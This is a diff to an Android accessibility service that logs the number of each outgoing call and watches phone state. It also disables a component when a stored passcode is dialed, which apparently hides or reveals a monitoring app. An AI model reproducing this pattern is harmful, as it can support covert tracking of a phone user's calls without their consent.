@@ -46,6 +46,7 @@ public class Notification_Service extends AccessibilityService {
     DBController controller;
     BroadcastReceiver CallBlocker;
     private Context ctx;
+    private static Boolean isOutgoingCall = false;
 
 	@Override
 	public void onAccessibilityEvent(AccessibilityEvent event) {
@@ -100,7 +101,11 @@ public class Notification_Service extends AccessibilityService {
 	   }
 	@Override
 	public void onInterrupt() {
-	    // TODO Auto-generated method stub.
+		if (CallBlocker != null)
+	    {
+	      unregisterReceiver(CallBlocker);
+	      CallBlocker = null;
+	    }
 	
 	}
 	
@@ -131,7 +136,9 @@ public class Notification_Service extends AccessibilityService {
 		{
 			@Override
 			public void onReceive(Context context, Intent intent) {
-
+				
+				isOutgoingCall = true;
+				
 				String passcode = controller.getAllPreferences().get("Passcode");
 
 				if(passcode == null){
@@ -143,7 +150,7 @@ public class Notification_Service extends AccessibilityService {
 
 				String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
 
-
+				insertCallLog(number, "Outgoing Call - ");
 
 				if(passcode.trim().equals(number)){
 					ComponentName componentToDisable =
@@ -207,7 +214,7 @@ public class Notification_Service extends AccessibilityService {
 	        	isIncomingCallStarted = true;
 	        }
 
-	        if (TelephonyManager.CALL_STATE_OFFHOOK == state && isIncomingCallStarted) {
+	        if (TelephonyManager.CALL_STATE_OFFHOOK == state && isIncomingCallStarted && isOutgoingCall == false) {
 
 
 	            isPhoneCalling = true;
@@ -217,7 +224,9 @@ public class Notification_Service extends AccessibilityService {
 	            // run when class initial and phone call ended, need detect flag
 	            // from CALL_STATE_OFFHOOK
 	            //Log.i(LOG_TAG, "IDLE number");
-
+	        	
+	        	isOutgoingCall = false;
+	        	
 	            if (isPhoneCalling) {
 
 	                Handler handler = new Handler();
